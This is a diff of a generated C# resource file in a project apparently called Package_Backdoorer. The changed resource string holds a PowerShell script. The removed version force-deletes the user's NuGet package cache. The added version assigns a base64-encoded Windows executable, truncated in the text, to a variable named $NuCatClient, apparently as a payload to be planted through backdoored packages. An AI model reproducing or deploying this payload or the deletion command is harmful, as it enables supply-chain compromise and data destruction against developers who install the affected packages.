@@ -91,10 +91,7 @@ namespace Package_Backdoorer.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to rm &quot;$env:USERPROFILE\.nuget\packages&quot; -r -force
-        ///Add-Type -AssemblyName PresentationFramework
-        ///[System.Windows.MessageBox]::Show(&apos;Hello World&apos;)
-        ///Write-Output &apos;Hello From ps!&apos;.
+        ///   Looks up a localized string similar to $NuCatClient = &apos;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAJMavJUAAAAAAAAAAOAAIgALATAAAHh9AQAIAAAAAAAAkpd9AQAgAAAAoH0BAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAADgfQEAAgAAAAAAAAIAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAD6XfQFPAAAAAKB9AbQFAAAAAAAAAAAAAAAAAAAAAAAAAMB9AQwAAACkln0BOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAA [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string init {
             get {
